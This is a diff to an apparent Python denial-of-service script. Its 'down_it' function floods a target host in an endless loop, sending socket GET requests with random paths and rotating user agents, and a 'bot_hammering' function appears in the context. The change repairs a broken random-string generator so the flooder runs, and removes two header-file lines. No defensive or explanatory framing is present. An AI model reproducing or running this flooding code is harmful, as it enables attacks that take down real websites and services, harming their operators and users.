@@ -44,13 +44,10 @@ def bot_hammering(url):
 def down_it(item):
 	try:
 		while True:
-			data():
-				chars = string.letters + string.digits
-				dataSize = 5
-				data = ''.join((random.choice(chars)) for x in range(dataSize))\
-				return data
-			data()
-			packet = str("GET /"+data +"HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+			chars = "abcdefghijklmnopqrstuvwxyz1234567890"
+			dataSize = 5
+			data = ''.join((random.choice(chars)) for x in range(dataSize))
+			packet = str("GET /"+str(data) +"HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
@@ -129,8 +126,6 @@ Accept-Encoding: gzip,deflate
 Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 Keep-Alive: 115
 Connection: keep-alive"""
-data = headers.read()
-headers.close()
 #task queue are q,w
 q = Queue()
 w = Queue()
